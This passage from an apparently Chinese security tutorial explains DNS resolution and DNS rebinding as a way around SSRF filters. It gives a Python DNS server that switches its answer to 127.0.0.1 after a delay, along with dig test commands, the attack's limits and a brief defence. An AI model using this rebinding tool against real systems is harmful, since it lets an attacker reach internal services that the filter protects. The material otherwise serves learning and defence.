&lt;p&gt;1. 浏览器搜索自身的 DNS 缓存，命中则解析，否则继续下一步&lt;/p&gt;
&lt;p&gt;查看 google 浏览器的缓存记录&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[chrome://net-internals/#dns](chrome://net-internals/#dns)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2. 浏览器搜索操作系统自身的 DNS 缓存，如果找到且没有国企（TTL 值），则解析结束，否则下一步（这一步很重要，TTL 值在这里其决定是否下一步）&lt;/p&gt;
&lt;p&gt;3. 尝试读取 hosts 文件，假设不找到，继续下一步&lt;/p&gt;
&lt;p&gt;4. 浏览器发起 DNS 系统调用，迭代过程如下：&lt;/p&gt;
&lt;p&gt;运营商 DNS--&amp;gt; 根域名服务器 --&amp;gt; 顶级域名服务器 --&amp;gt; 我们设置 NS 域名服务器。（我们可以递归向下设置 TTL 的值）&lt;/p&gt;
&lt;p&gt;5. 找到 IP 地址，简历对应的 TCP 连接，开始通信。&lt;/p&gt;
&lt;p&gt;SSRF 发起的请求，curl 发起的请求跟前面相比就少了第一步的查询过程&lt;/p&gt;
&lt;h4 id=&#34;dns重绑定-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns重绑定-2&#34;&gt;#&lt;/a&gt; DNS 重绑定：&lt;/h4&gt;
&lt;p&gt;概念：当我们发起域名解析请求的时候，第一次方法会返回以恶个 IP 地址 A，但是当我们发起第二次域名解析请求的时候，却会返回一个不同于 A 的 IP 地址 B&lt;/p&gt;
&lt;p&gt;比如直接&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl www.ak47.com 获取的解析ip为60.221.158.45，将其认定为外网ip，给与通行，但是程序为了考虑一些cdn的因素，第二次请求判断的时候不会去第一个解析结果的ip

那么第二次照样是curl www.ak47.com 这个时候我们可以在这个短暂的第一次和第二次的间隔里面控制第二次的解析ip为127.0.0.1（可以自己设置），从而实现访问内网的应用，实现重绑定攻击。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;脚本（本地搭建）：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# rebind_dns.py&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dnslib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;server &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; DNSServer&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; BaseResolver&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dnslib &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; DNSRecord&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; QTYPE&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; RR&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; A&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; DNSHeader&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 域名记录访问时间&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;visit_log &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 域名配置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;RECORD_DOMAIN &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;rebind.test.&#34;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 注意末尾要有点&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;IP1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;1.2.3.4&#34;&lt;/span&gt;                &lt;span class=&#34;token comment&#34;&gt;# 第一次返回的攻击者站点 IP&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;IP2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;127.0.0.1&#34;&lt;/span&gt;              &lt;span class=&#34;token comment&#34;&gt;# 后续返回目标服务 IP（如 localhost）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;TTL &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;                        &lt;span class=&#34;token comment&#34;&gt;# TTL 设置为 1 秒&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SWITCH_DELAY &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;             &lt;span class=&#34;token comment&#34;&gt;# 多少秒后进行切换&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RebindResolver&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;BaseResolver&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;resolve&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        qname &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;qname&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        now &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; qname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;endswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;RECORD_DOMAIN&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; qname &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; visit_log&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                visit_log&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;qname&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; now&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            elapsed &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; now &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; visit_log&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;qname&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; IP1 &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; elapsed &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; SWITCH_DELAY &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; IP2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;[+] Responding &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;qname&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt; with &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            reply &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reply&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            reply&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;add_answer&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;RR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;qname&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; QTYPE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; rdata&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ttl&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TTL&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; reply&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reply&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 启动服务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    resolver &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; RebindResolver&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    server &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; DNSServer&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;resolver&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5353&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; address&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; tcp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[*] DNS server running at UDP :5353 ...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    server&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;启动：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; python3 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;.py&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;测试：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;模拟请求：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;dig&lt;/span&gt; @127.0.0.1 &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5353&lt;/span&gt; rebind.test（1.2.3.4）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;过十秒---》&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;dig&lt;/span&gt; @127.0.0.1 &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5353&lt;/span&gt; rebind.test（127.0.0.1）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;dig&lt;/span&gt; @127.0.0.1 &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5353&lt;/span&gt; rebind.test（127.0.0.1）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;第一次：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202507091551409.png&#34; alt=&#34;image-20250709155108028&#34; /&gt;&lt;/p&gt;
&lt;p&gt;第二三次：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202507091551412.png&#34; alt=&#34;image-20250709155138082&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;防御思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御思路&#34;&gt;#&lt;/a&gt; 防御思路&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;局限性:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;时间窗口问题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DNS 缓存的问题。即使我们在前面实现的时候设置了 TTL 为 0，但是有些公共 DNS 服务器，比如 114.114.114.114 还是会把记录进行缓存，完全不按照标准协议来，遇到这种情况是无解的。但是 8.8.8.8 是严格按照 DNS 协议去管理缓存的，如果设置 TTL 为 0，则不会进行缓存。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 缓存机制&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux dns 默认不缓存，windows and mac, 为了加快 http 访问速度，系统会进行 DNS 缓存&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用环境问题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(1) java 默认失败&lt;/p&gt;
&lt;p&gt;Java 应用的默认 TTL 为 10s，这个默认配置会导致 DNS Rebinding 绕过失败&lt;/p&gt;
&lt;p&gt;测试的时候可以修改配置:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;java.security.Security.setProperty(&amp;quot;networkaddress.cache.negative.ttl&amp;quot; , &amp;quot;0&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(2) PHP 默认 TTL 为 0, 可以攻击&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其实这个漏洞局限性还是很大的，但是如果能确认发起 DNS 请求，针对性大量请求还是能提高命中的概率。&lt;/p&gt;
&lt;p&gt;那么这种攻击有什么办法解决呢？&lt;/p&gt;
&lt;p&gt;小弟就来丢一个完美的解决的方案？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;原理:&lt;/p&gt;
&lt;p&gt;通过控制 2 次的 DNS 查询请求的间隔低于 TTL 值，确保两次查询的结果一致。&lt;/p&gt;
&lt;p&gt;技术实现:&lt;/p&gt;
&lt;p&gt;所以代码写一个请求判断，Linux 系统修改默认的 TTL 值为 10, 即可很轻松解决这个问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; rce&lt;/h2&gt;
